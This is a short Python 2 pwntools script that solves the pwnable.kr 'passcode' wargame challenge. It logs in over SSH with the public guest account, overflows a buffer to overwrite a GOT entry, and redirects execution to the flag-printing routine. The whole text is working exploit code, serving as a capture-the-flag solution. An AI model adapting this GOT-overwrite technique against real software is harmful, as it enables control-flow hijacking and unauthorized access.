#!/usr/bin/python2
from pwn import *

s = ssh('passcode', 'pwnable.kr', 2222, 'guest')
p = s.process('./passcode')

def Sendline(s):
    p.sendline(s)
    print(s)
    sleep(0.5)

print p.read(),
exp_buf = 'a' * 96 + '\x18\xa0\x04\x08'
Sendline(exp_buf)

print p.read(),
payload = str(0x080485e3)
Sendline(payload)

print p.read(),
Sendline('fuck')

recv = p.readall()
recv = recv.replace('\xa0', '')
print(recv)
